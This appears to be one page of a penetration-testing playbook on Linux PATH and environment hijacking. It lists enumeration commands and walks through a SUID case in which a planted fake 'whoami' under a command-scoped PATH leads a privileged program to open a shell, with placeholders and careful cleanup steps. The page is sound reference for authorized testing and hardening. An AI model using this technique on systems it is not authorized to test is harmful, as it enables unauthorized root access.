# LPRIV-09. PATH and environment hijacking

**Run this when:** a privileged executable or script runs a relative command, or its environment affects program resolution.

PATH and environment:

```bash
printf '%s\n' "$PATH" | tr ':' '\n'
env
cat /etc/environment 2>/dev/null
while IFS= read -r d; do
  test -n "$d" || d=.
  ls -ld -- "$d" 2>/dev/null
done < <(printf '%s' "$PATH" | tr ':' '\n')
```

**Look for:** writable PATH directories, empty entries, inherited variables, and privileged code that invokes a command without a slash.

**If found:** confirm the exact consumer in [LPRIV-07](./lpriv-07). SUID and capability attributes route back to [LPRIV-04](./lpriv-04).

## Prove resolution before changing anything

Bare commands inside the program:

```bash
strings -a '<ABSOLUTE_PRIVILEGED_PROGRAM>' | grep -E '(^|/)(sh|bash|cp|tar|service|systemctl|whoami)$' | head -n 40
namei -l -- '<WRITABLE_PATH_DIRECTORY>'
command -V '<RELATIVE_COMMAND>'
```

Static strings are only a lead. Prefer reviewed source or observable runtime behavior. An absolute lookup, cleared environment, explicit `--`, or changed working directory breaks many PATH hypotheses.

## Preserve the exact retired SUID PATH case

The retired case applied only to a reviewed SUID program that PATH-resolved `whoami`, compared its text to one expected account name, then separately changed identity and opened a shell. The helper only satisfied the text check. It did not prove privilege.

Private lookup dir and helper:

```bash
mkdir -m 0700 -- '<NEW_PRIVATE_LOOKUP_DIRECTORY>'
(umask 077; set -C; printf '#!/bin/sh\nprintf "%s\\n" "<EXPECTED_ACCOUNT_NAME>"\n' > '<NEW_PRIVATE_LOOKUP_DIRECTORY>/whoami')
chmod 0700 -- '<NEW_PRIVATE_LOOKUP_DIRECTORY>/whoami'
sha256sum -- '<NEW_PRIVATE_LOOKUP_DIRECTORY>/whoami'
(PATH='<NEW_PRIVATE_LOOKUP_DIRECTORY>:/usr/bin:/bin'; command -v whoami; whoami; '<ABSOLUTE_REVIEWED_SUID_PROGRAM>')
```

Use a command-scoped PATH. Do not export it into the parent. If a shell opens, verify with absolute `/usr/bin/id`, `/bin/hostname`, and `/proc/self/status`, never the substituted `whoami`.

Drop the PATH, verify resolution:

```bash
exit
printf 'Parent PATH: %s\n' "$PATH"
command -v whoami
# Remove only when the helper inode, metadata, and SHA-256 still match your records:
rm -i -- '<NEW_PRIVATE_LOOKUP_DIRECTORY>/whoami' && rmdir -- '<NEW_PRIVATE_LOOKUP_DIRECTORY>'
```

If the helper changed or the directory contains other files, stop and preserve it. Do not recursively delete a shared or unexpected path.

**If nothing stands out:** continue to [LPRIV-10](./lpriv-10).
